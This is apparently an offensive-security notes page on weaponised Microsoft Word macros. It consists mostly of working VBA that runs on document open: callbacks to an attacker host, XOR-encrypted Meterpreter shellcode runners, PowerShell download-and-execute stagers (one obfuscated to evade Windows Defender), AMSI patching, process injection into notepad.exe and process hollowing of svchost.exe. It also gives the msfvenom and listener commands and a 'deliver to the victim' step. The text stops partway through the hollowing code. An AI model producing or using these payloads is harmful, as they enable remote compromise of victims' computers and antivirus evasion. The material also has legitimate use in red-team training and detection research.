---
title: Microsoft Word (Macros)
sidebar_position: 2
---


### **Callback Pinging**

**Purpose** This Macros file is just to get a callback from the victim and understand what is happening, it is not ideal for real operations but it is for testing purposes

**Code**

```csharp
Sub MyMacro()
    Dim Command As String
    Command = "C:\Windows\System32\curl.exe http://[ATTACKER_IP]/worked"
    Shell Command, vbHide
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

```

### **Determine Target Architecture**

**Purpose** We can use special non-malicious Macros to find the architecture of the target and therefore crafting the payloads and stagers correctly avoid running issues. Remember to run `nc -nvlp 80` prior to delivering them.

**Macros Using Curl**

```csharp
Option Explicit

Sub SendProcessInfo()
    Dim processName As String, serverUrl As String, wmiService As Object, processList As Object, processItem As Object
    Dim result As String, is64Bit As Boolean

    serverUrl = "http://CHANGE TO YOUR IP" ' Change this to your server endpoint
    processName = "winword.exe" ' Replace with your process name

    ' Create WMI query and get process list
    Set wmiService = GetObject("winmgmts:\\.\root\CIMV2")
    Set processList = wmiService.ExecQuery("SELECT * FROM Win32_Process WHERE Name = '" & processName & "'")

    ' Check if process is found and determine 64-bit status
    If processList.Count > 0 Then
        For Each processItem In processList
            is64Bit = InStr(1, processItem.CommandLine, "Program Files (x86)", vbTextCompare) = 0
            result = "Process: " & processName & ", 64-bit: " & CStr(is64Bit)
        Next
    Else
        result = "Process not found."
    End If

    ' Execute cURL command
    Shell "cmd.exe /c curl -X POST -d """ & result & """ " & serverUrl, vbHide
End Sub
Sub AutoOpen()
    SendProcessInfo
End Sub
Sub DocumentOpen()
    SendProcessInfo
End Sub

```

**Macros Using PowerShell**

```csharp
Option Explicit

Sub SendProcessInfo()
    Dim processName As String
    Dim is64Bit As Boolean
    Dim result As String
    Dim wmiService As Object
    Dim processList As Object
    Dim processItem As Object
    Dim psCommand As String

    processName = "explorer.exe" ' Use uppercase for process name for consistency
    Set wmiService = GetObject("winmgmts:\\.\root\CIMV2")
    Set processList = wmiService.ExecQuery("SELECT * FROM Win32_Process WHERE Name = '" & processName & "'")

    If processList.Count > 0 Then
        For Each processItem In processList
            ' Check if the executable is located in "Program Files (x86)"
            is64Bit = (InStr(1, processItem.ExecutablePath, "Program Files (x86)", vbTextCompare) = 0)
            Exit For ' Only need to check the first matching process
        Next processItem
        result = "{""process"": """ & processName & """, ""64bit"": " & CStr(is64Bit) & "}"
    Else
        result = "{""process"": """ & processName & """, ""status"": ""not found""}"
    End If

    ' Prepare the PowerShell command
    psCommand = "powershell -Command ""Invoke-RestMethod -Uri 'http://[ATTACKER_IP]' -Method Post -Body '" & result & "' -ContentType 'application/json'"""

    ' Execute the PowerShell command
    Shell "cmd.exe /c " & psCommand, vbHide
End Sub

Sub AutoOpen()
SendProcessInfo
End Sub
Sub DocumentOpen()
SendProcessInfo
End Sub

```

### **Shellcode Runner - Meterpreter Encrypted**

**Steps**

1. **Create your shellcode**

```bash
# If you change the key, then change it in the vba code too
msfvenom -p windows/meterpreter/reverse_https LHOST=[LHOST] LPORT=[LPORT] EXITFUNC=thread -f vbapplication --encrypt xor --encrypt-key a

```

1. **Create a new file Macros** and insert your shellcode from step above and save the file as a `.docm`

```csharp
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function Sleep Lib "kernel32" (ByVal mili As Long) As Long
Private Declare PtrSafe Function FlsAlloc Lib "kernel32" (ByVal lpCallback As LongPtr) As Long

Sub Document_Open()
  ShellcodeRunner
End Sub

Sub AutoOpen()
  ShellcodeRunner
End Sub

Function ShellcodeRunner()
  Dim sc As Variant
  Dim tmp As LongPtr
  Dim addr As LongPtr
  Dim counter As Long
  Dim data As Long
  Dim res As Long
  Dim dream As Integer
  Dim before As Date

  ' Check if we're in a sandbox by calling a rare-emulated API
  If IsNull(FlsAlloc(tmp)) Then
    Exit Function
  End If

  ' Sleep to evade in-memory scan + check if the emulator did not fast-forward through the sleep instruction
  dream = Int((1500 * Rnd) + 2000)
  before = Now()
  Sleep (dream)
  If DateDiff("s", t, Now()) < dream Then
    Exit Function
  End If

  Key = "a"

  ' msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.13.37 LPORT=443 EXITFUNC=thread -f vbapplication --encrypt xor --encrypt-key a
  sc = Array(157, 137, 238, 97, 97, 97, 1, 80, 179, 5, 234, 51, 81, 234, 51, 109, 232, 132, 234, 51, 117, 80, 158, 110, 214, 43, 71, 234, 19, 73, 80, 161, 205, 93, 0, 29, 99, 77, 65, 160, 174, 108, 96, 166, 40, 20, 142, 51, 54, 234, 51, 113, 234, 35, 93, 96, 177, 234, 33, 25, 228, 161, 21, 45, 96, 177, 49, 234, 41, 121, 234, 57, 65, 96, 178, 228, 168, 21, 93, 80, 158, _
40, 234, 85, 234, 96, 183, 80, 161, 160, 174, 108, 205, 96, 166, 89, 129, 20, 149, 98, 28, 153, 90, 28, 69, 20, 129, 57, 234, 57, 69, 96, 178, 7, 234, 109, 42, 234, 57, 125, 96, 178, 234, 101, 234, 96, 177, 232, 37, 69, 69, 58, 58, 0, 56, 59, 48, 158, 129, 57, 62, 59, 234, 115, 136, 225, 158, 158, 158, 60, 9, 82, 83, 97, 97, 9, 22, 18, 83, 62, 53, _
9, 45, 22, 71, 102, 232, 137, 158, 177, 217, 241, 96, 97, 97, 72, 165, 53, 49, 9, 72, 225, 10, 97, 158, 180, 11, 107, 9, 161, 201, 83, 4, 9, 99, 97, 96, 218, 232, 135, 49, 49, 49, 49, 33, 49, 33, 49, 9, 139, 110, 190, 129, 158, 180, 246, 11, 113, 55, 54, 9, 248, 196, 21, 0, 158, 180, 228, 161, 21, 107, 158, 47, 105, 20, 141, 137, 6, 97, 97, 97, _
11, 97, 11, 101, 55, 54, 9, 99, 184, 169, 62, 158, 180, 226, 153, 97, 31, 87, 234, 87, 11, 33, 9, 97, 113, 97, 97, 55, 11, 97, 9, 57, 197, 50, 132, 158, 180, 242, 50, 11, 97, 55, 50, 54, 9, 99, 184, 169, 62, 158, 180, 226, 153, 97, 28, 73, 57, 9, 97, 33, 97, 97, 11, 97, 49, 9, 106, 78, 110, 81, 158, 180, 54, 9, 20, 15, 44, 0, 158, 180, _
63, 63, 158, 109, 69, 110, 228, 17, 158, 158, 158, 136, 250, 158, 158, 158, 96, 162, 72, 167, 20, 160, 162, 218, 129, 124, 75, 107, 9, 199, 244, 220, 252, 158, 180, 93, 103, 29, 107, 225, 154, 129, 20, 100, 218, 38, 114, 19, 14, 11, 97, 50, 158, 180)

  Dim scSize As Long
    scSize = UBound(sc)
    ' Decrypt shellcode
    Dim keyArrayTemp() As Byte
    keyArrayTemp = Key

    i = 0
    For x = 0 To UBound(sc)
        sc(x) = sc(x) Xor keyArrayTemp(i)
        i = (i + 2) Mod (Len(Key) * 2)
    Next x

    ' TODO set the SIZE here (use a size > to the shellcode size)
    Dim buf(685) As Byte
    For y = 0 To UBound(sc)
        buf(y) = sc(y)
    Next y

  ' &H3000 = 0x3000 = MEM_COMMIT | MEM_RESERVE
  ' &H40 = 0x40 = PAGE_EXECUTE_READWRITE
  addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)

  For counter = LBound(buf) To UBound(buf)
    data = buf(counter)
    res = RtlMoveMemory(addr + counter, data, 1)
  Next counter

  res = CreateThread(0, 0, addr, 0, 0, 0)
End Function

```

1. **Start your Metasploit listener**

```bash
sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost [ATTACKER_IP]; set lport [PORT]; exploit"

```

1. **Deliver your Word Stager and wait for access**

### **Shellcode Runner - C# VBA Encrypted**

**Steps**

1. **Create your Shellcode**

```bash
# If something is not working consider using 32-bits payloads (windows/meterpreter/reverse_http)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=[LHOST] LPORT=[LPORT] EXITFUNC=thread -f csharp

```

1. **Encrypt the shellcode**, they are many ways to do it but I will use this personal C# VBA Encrypter

```python
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace vba_encrypter
{
    class Program
    {
        static void Main(string[] args)
        {
            byte[] buf = new byte[681] {0xfc,0xe8,0x8f,0x00,0x00,0x00,
0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,
....
0x53,0xff,0xd5};
            byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
            }
            uint counter = 0;
            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach (byte b in encoded)
            {
                hex.AppendFormat("{0:D}, ", b);
                counter++;
                if (counter % 50 == 0)
                {
                    hex.AppendFormat("_{0}", Environment.NewLine);
                }
            }
            Console.WriteLine("The payload is: " + hex.ToString());
        }
    }
}

```

1. **Create the Macros file**, use code below inserting your encrypted shellcode and save the file as a `.docm`

```csharp
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As LongPtr

    buf = Array(254, 234, 145, ..., 85, 1, 215)

    For i = 0 To UBound(buf)
    buf(i) = buf(i) - 2
    Next i

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    For counter = LBound(buf) To UBound(buf)
    data = buf(counter)
    res = RtlMoveMemory(addr + counter, data, 1)
    Next counter

    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

```

1. **Start your Metasploit listener**

```bash
sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost [ATTACKER_IP]; set lport [PORT]; exploit"

```

1. **Deliver your Macros** and wait for execution and your reverse shell

### **PowerShell Stager - Encrypted & Obfuscated**

**IMPORTANT: it was tested in lab machine and successfully bypass Windows Defender, but if AMSI protection is enabled then it could not work**

1. **Create your Shellcode**

```bash
# If something is not working consider using 32-bits payloads (windows/meterpreter/reverse_http)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=[LHOST] LPORT=[LPORT] EXITFUNC=thread -f ps1

```

1. **Create your PowerShell script**, inset here your shellcode and save the file as `run.ps1`, this is supposed to be loaded directly in memory, therefore not touching the disk and avoiding AV scanning

```powershell
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle,
        UInt32 dwMilliseconds);
}
"@

Add-Type $Kernel32

# INSERT SHELLCODE HERE
[Byte[]] $buf = 0xfc,0x48,0x83,..,0x41,0x89,0xda,0xff

$size = $buf.Length

[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)

$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")

```

1. **Encrypt your PS Code**, this scipt will transform the characters to their ASCII value and do a Caesar encryption

```powershell
$payload = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://[ATTACKER_IP]/[stager_filename].txt'))"

[string]$output = ""

$payload.ToCharArray() | %{
    [string]$thischar = [byte][char]$_ + 17
    if($thischar.Length -eq 1)
    {
        $thischar = [string]"00" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 2)
    {
        $thischar = [string]"0" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 3)
    {
        $output += $thischar
    }
}
$output | clip
$output

```

1. **Create your Macros**, copy the contents from above step to the payload part and save the file as a `.docm`

```csharp
Function Pears(Beets)
    Pears = Chr(Beets - 17)
End Function

Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
    Do
    Oatmilk = Oatmilk + Pears(Strawberries(Milk))
    Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = Oatmilk
End Function

Function MyMacro()
    Dim Apples As String
    Dim Water As String

    // Payload resulting from previous step
    Apples = "1291281361042112211.............640633137133056058058"
    Water = Nuts(Apples)
    GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
End Function

Sub AutoOpen()
    Mymacro
End Sub

```

### **PowerShell Stager - Unencrypted**

Keep in mind that these makes some *Win32 API* calls to avoid loading in disk and avoid AV detection. We need to things:

1. The Macros stager that will download the payload, this one does not touches the disk, only memory.
2. The malicious powershell payload that will trigger our reverse shell.

**Steps**

1. **Create your Shellcode**

```bash
# If something is not working consider using 32-bits payloads (windows/meterpreter/reverse_http)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=[LHOST] LPORT=[LPORT] EXITFUNC=thread -f ps1

```

1. **Create your PowerShell script**, inset here your shellcode and save the file as `run.ps1`

```powershell
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle,
        UInt32 dwMilliseconds);
}
"@

Add-Type $Kernel32

# INSERT SHELLCODE HERE
[Byte[]] $buf = 0xfc,0x48,0x83,..,0x41,0x89,0xda,0xff

$size = $buf.Length

[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)

$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")

```

1. **Create your Macros**, and save the file as a `.docm`

```csharp
Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://[ATTACKER_IP]/[stager_filename].ps1') | IEX"
    Shell str, vbHide
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

```

1. **Start your HTTP Server** to host the ps stager

```bash
python3 -m http.server 80

```

1. **Start your Metasploit listener**

```bash
sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost [ATTACKER_IP]; set lport [PORT]; exploit"

```

1. **Deliver the Macros to the victim**

### **Process Injection - Meterpreter Encrypted**

1. **Create your shellcode**

```bash
# If you change the key, then change it in the vba code too
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[LHOST] LPORT=[LPORT] EXITFUNC=thread -f vbapplication --encrypt xor --encrypt-key '0xfa'

```

1. **Create a new file Macros** and insert your shellcode from step above and save the file as a `.docm`, in this case it will inject into `notepad.exe` but you can change this

```csharp
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
Private Declare PtrSafe Function getmod Lib "KERNEL32" Alias "GetModuleHandleA" (ByVal lpLibFileName As String) As LongPtr
Private Declare PtrSafe Function GetPrAddr Lib "KERNEL32" Alias "GetProcAddress" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
Private Declare PtrSafe Function VirtPro Lib "KERNEL32" Alias "VirtualProtect" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProcess As LongPtr, lpflOldProtect As LongPtr) As LongPtr
Private Declare PtrSafe Sub patched Lib "KERNEL32" Alias "RtlFillMemory" (Destination As Any, ByVal Length As Long, ByVal Fill As Byte)
Private Declare PtrSafe Function OpenProcess Lib "KERNEL32" (ByVal dwDesiredAcess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As LongPtr) As LongPtr
Private Declare PtrSafe Function VirtualAllocEx Lib "KERNEL32" (ByVal hProcess As Integer, ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, ByVal fAllocType As LongPtr, ByVal flProtect As LongPtr) As LongPtr
Private Declare PtrSafe Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByRef lpBuffer As LongPtr, ByVal nSize As LongPtr, ByRef lpNumberOfBytesWritten As LongPtr) As LongPtr
Private Declare PtrSafe Function CreateRemoteThread Lib "KERNEL32" (ByVal ProcessHandle As LongPtr, ByVal lpThreadAttributes As Long, ByVal dwStackSize As LongPtr, ByVal lpStartAddress As LongPtr, ByVal lpParameter As Long, ByVal dwCreationFlags As Long, ByVal lpThreadID As Long) As LongPtr
Private Declare PtrSafe Function CloseHandle Lib "KERNEL32" (ByVal hObject As LongPtr) As Boolean

Function mymacro()
    Dim myTime
    Dim Timein As Date
    Dim second_time
    Dim Timeout As Date
    Dim subtime As Variant
    Dim vOut As Integer
    Dim Is64 As Boolean
    Dim StrFile As String

    myTime = Time
    Timein = Date + myTime
    Sleep (4000)
    second_time = Time
    Timeout = Date + second_time
    subtime = DateDiff("s", Timein, Timeout)
    vOut = CInt(subtime)
    If subtime < 3.5 Then
        Exit Function
    End If

    Dim sc As Variant
    Dim key As String
    ' TODO change the key
    key = "0xfa"

    'msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 EXITFUNC=thread -f vbapplication --encrypt xor --encrypt-key '0xfa'
    sc = Array(204, 144, 233, 97, 48, 120, 6, 80, 226, 28, 237, 51, 0, 241, 131, 234, 98, 116, 237, 51, 36, 243, 20, 73, 1, 135, 105, 214, 122, 94, 87, 161, 156, 68, 7, 29, 50, 84, 70, 160, 255, 117, 103, 166, 121, 13, 137, 51, 103, 243, 52, 113, 187, 58, 90, 96, 224, 243, 38, 25, 181, 184, 18, 45, 49, 168, 54, 234, 120, 96, 237, 57, 16, 121, 181, 228, 249, 12, 90, 40, 187, _
76, 237, 96, 230, 73, 153, 80, 240, 212, 167, 174, 61, 121, 161, 89, 208, 13, 146, 98, 77, 128, 93, 28, 20, 13, 134, 57, 187, 32, 66, 96, 227, 30, 237, 109, 123, 243, 62, 125, 49, 171, 237, 101, 187, 121, 182, 232, 116, 92, 66, 58, 107, 25, 63, 59, 97, 135, 134, 57, 111, 34, 237, 115, 217, 248, 153, 158, 207, 37, 14, 82, 2, 120, 102, 9, 71, 11, 84, 62, 100, _
16, 42, 22, 22, 127, 239, 137, 207, 168, 222, 241, 49, 120, 102, 72, 244, 44, 54, 9, 25, 248, 13, 97, 207, 173, 12, 107, 88, 184, 206, 76, 239, 16, 100, 97, 49, 195, 239, 135, 96, 40, 54, 49, 112, 40, 38, 49, 88, 146, 105, 190, 208, 135, 179, 246, 90, 104, 48, 54, 88, 225, 195, 21, 81, 135, 179, 228, 240, 12, 108, 158, 126, 112, 19, 141, 216, 31, 102, 97, 48, _
18, 102, 11, 52, 46, 49, 9, 50, 161, 174, 62, 207, 173, 229, 153, 48, 6, 80, 234, 6, 18, 38, 9, 48, 104, 102, 97, 102, 18, 102, 9, 104, 220, 53, 132, 207, 173, 245, 50, 90, 120, 48, 50, 103, 16, 100, 184, 248, 39, 153, 180, 179, 128, 102, 28, 24, 32, 14, 97, 112, 120, 102, 11, 48, 40, 14, 106, 31, 119, 86, 158, 229, 47, 14, 20, 94, 53, 7, 158, 229, _
38, 56, 158, 60, 92, 105, 228, 64, 135, 153, 158, 217, 227, 153, 158, 207, 121, 165, 72, 246, 13, 167, 162, 139, 152, 123, 75, 58, 16, 192, 244, 141, 229, 153, 180, 12, 126, 26, 107, 176, 131, 134, 20, 53, 195, 33, 114, 66, 23, 12, 97, 99, 135, 179)

    Dim scSize As Long
    scSize = UBound(sc)
    ' Decrypt shellcode
    Dim keyArrayTemp() As Byte
    keyArrayTemp = key

    i = 0
    For x = 0 To UBound(sc)
        sc(x) = sc(x) Xor keyArrayTemp(i)
        i = (i + 2) Mod (Len(key) * 2)
    Next x

    ' TODO set the SIZE here (use a size > to the shellcode size)
    Dim buf(685) As Byte
    For y = 0 To UBound(sc)
        buf(y) = sc(y)
    Next y

    'grab handle to target, which has to be running if this macro is opened from word
    Shell "notepad.exe", vbHide
    pid = getPID("notepad.exe")
    Handle = OpenProcess(&H1F0FFF, False, pid)

    'MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
    addr = VirtualAllocEx(Handle, 0, UBound(buf), &H3000, &H40)
    'byte-by-byte to attempt sneaking our shellcode past AV hooks
    For counter = LBound(buf) To UBound(buf)
        binData = buf(counter)
        Address = addr + counter
        res = WriteProcessMemory(Handle, Address, binData, 1, 0&)
        Next counter
    thread = CreateRemoteThread(Handle, 0, 0, addr, 0, 0, 0)
End Function
Sub patch(StrFile As String, Is64 As Boolean)
    Dim lib As LongPtr
    Dim Func_addr As LongPtr
    Dim temp As LongPtr
    lib = getmod(StrFile)
    Func_addr = GetPrAddr(lib, "Am" & Chr(115) & Chr(105) & "U" & Chr(97) & "c" & "Init" & Chr(105) & Chr(97) & "lize") - off
    temp = VirtPro(ByVal Func_addr, 32, 64, 0)
    patched ByVal (Func_addr), 1, ByVal ("&H" & "90")
    patched ByVal (Func_addr + 1), 1, ByVal ("&H" & "C3")
    temp = VirtPro(ByVal Func_addr, 32, old, 0)
    Func_addr = GetPrAddr(lib, "Am" & Chr(115) & Chr(105) & "U" & Chr(97) & "c" & "Init" & Chr(105) & Chr(97) & "lize") - off
    temp = VirtPro(ByVal Func_addr, 32, 64, old)
    patched ByVal (Func_addr), 1, ByVal ("&H" & "90")
    patched ByVal (Func_addr + 1), 1, ByVal ("&H" & "C3")
    temp = VirtPro(ByVal Func_addr, 32, old, 0)
End Sub
Function getPID(injProc As String) As LongPtr
    Dim objServices As Object, objProcessSet As Object, Process As Object

    Set objServices = GetObject("winmgmts:\\.\root\CIMV2")
    Set objProcessSet = objServices.ExecQuery("SELECT ProcessID, name FROM Win32_Process WHERE name = """ & injProc & """", , 48)
    For Each Process In objProcessSet
        getPID = Process.processID
    Next
End Function
Sub test()
    mymacro
End Sub
Sub Document_Open()
    test
End Sub
Sub AutoOpen()
    test
End Sub

```

1. **Start your Metasploit listener**

```bash
sudo msfconsole -q -x "use multi/handler; set payload windows/meterpreter/reverse_https; set lhost [ATTACKER_IP]; set lport [PORT]; exploit"

```

1. **Deliver your Macros** and wait for execution and your reverse shell

### **Process Hollow - Meterpreter Encrypted**

1. **Create your shellcode**

```bash
# If you change the key, then change it in the vba code too
msfvenom -p windows/meterpreter/reverse_https LHOST=[LHOST] LPORT=[LPORT] EXITFUNC=thread -f vbapplication --encrypt xor --encrypt-key 'CHANGEMYKEY'

```

1. **Create a new file Macros** and insert your shellcode from step above and save the file as a `.docm`, in this case it will inject into `notepad.exe` but you can change this

```csharp
#If Win64 Then
    Private Declare PtrSafe Function ZwQueryInformationProcess Lib "NTDLL" (ByVal hProcess As LongPtr, ByVal procInformationClass As Long, ByRef procInformation As PROCESS_BASIC_INFORMATION, ByVal ProcInfoLen As Long, ByRef retlen As Long) As Long
    Private Declare PtrSafe Function CreateProcessA Lib "KERNEL32" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFOA, lpProcessInformation As PROCESS_INFORMATION) As LongPtr
    Private Declare PtrSafe Function ReadProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, lpBuffer As Any, ByVal dwSize As Long, ByVal lpNumberOfBytesRead As Long) As Long
    Private Declare PtrSafe Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, lpBuffer As Any, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As Long) As Long
    Private Declare PtrSafe Function ResumeThread Lib "KERNEL32" (ByVal hThread As LongPtr) As Long
    Private Declare PtrSafe Sub RtlZeroMemory Lib "KERNEL32" (Destination As STARTUPINFOA, ByVal Length As Long)
    Private Declare PtrSafe Function GetProcAddress Lib "KERNEL32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
    Private Declare PtrSafe Function LoadLibraryA Lib "KERNEL32" (ByVal lpLibFileName As String) As LongPtr
    Private Declare PtrSafe Function VirtualProtect Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flNewProtect As Long, ByRef lpflOldProtect As Long) As Long
    Private Declare PtrSafe Function CryptBinaryToStringA Lib "CRYPT32" (ByRef pbBinary As Any, ByVal cbBinary As Long, ByVal dwFlags As Long, ByRef pszString As Any, pcchString As Any) As Long
#Else
    Private Declare Function ZwQueryInformationProcess Lib "NTDLL" (ByVal hProcess As LongPtr, ByVal procInformationClass As Long, ByRef procInformation As PROCESS_BASIC_INFORMATION, ByVal ProcInfoLen As Long, ByRef retlen As Long) As Long
    Private Declare Function CreateProcessA Lib "KERNEL32" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFOA, lpProcessInformation As PROCESS_INFORMATION) As LongPtr
    Private Declare Function ReadProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, lpBuffer As Any, ByVal dwSize As Long, ByVal lpNumberOfBytesRead As Long) As Long
    Private Declare Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, lpBuffer As Any, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As Long) As Long
    Private Declare Function ResumeThread Lib "KERNEL32" (ByVal hThread As LongPtr) As Long
    Private Declare Sub RtlZeroMemory Lib "KERNEL32" (Destination As STARTUPINFOA, ByVal Length As Long)
    Private Declare Function GetProcAddress Lib "KERNEL32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
    Private Declare Function LoadLibraryA Lib "KERNEL32" (ByVal lpLibFileName As String) As LongPtr
    Private Declare Function VirtualProtect Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flNewProtect As Long, ByRef lpflOldProtect As Long) As Long
    Private Declare Function CryptBinaryToStringA Lib "CRYPT32" (ByRef pbBinary As Any, ByVal cbBinary As Long, ByVal dwFlags As Long, ByRef pszString As Any, pcchString As Any) As Long
#End If

Private Type PROCESS_BASIC_INFORMATION
    Reserved1 As LongPtr
    PebAddress As LongPtr
    Reserved2 As LongPtr
    Reserved3 As LongPtr
    UniquePid As LongPtr
    MoreReserved As LongPtr
End Type

Private Type STARTUPINFOA
    cb As Long
    lpReserved As String
    lpDesktop As String
    lpTitle As String
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As String
    hStdInput As LongPtr
    hStdOutput As LongPtr
    hStdError As LongPtr
End Type

Private Type PROCESS_INFORMATION
    hProcess As LongPtr
    hThread As LongPtr
    dwProcessId As Long
    dwThreadId As Long
End Type

Sub Document_Open()
    hollow
End Sub

Sub AutoOpen()
    hollow
End Sub

' Performs process hollowing to run shellcode in svchost.exe
Function hollow()
    Dim si As STARTUPINFOA
    RtlZeroMemory si, Len(si)
    si.cb = Len(si)
    si.dwFlags = &H100
    Dim pi As PROCESS_INFORMATION
    Dim procOutput As LongPtr
    ' Start svchost.exe in a suspended state
    procOutput = CreateProcessA(vbNullString, "C:\\Windows\\System32\\svchost.exe", ByVal 0&, ByVal 0&, False, &H4, 0, vbNullString, si, pi)

    Dim ProcBasicInfo As PROCESS_BASIC_INFORMATION
    Dim ProcInfo As LongPtr
    ProcInfo = pi.hProcess
    Dim PEBinfo As LongPtr

#If Win64 Then
    zwOutput = ZwQueryInformationProcess(ProcInfo, 0, ProcBasicInfo, 48, 0)
    PEBinfo = ProcBasicInfo.PebAddress + 16
    Dim AddrBuf(7) As Byte
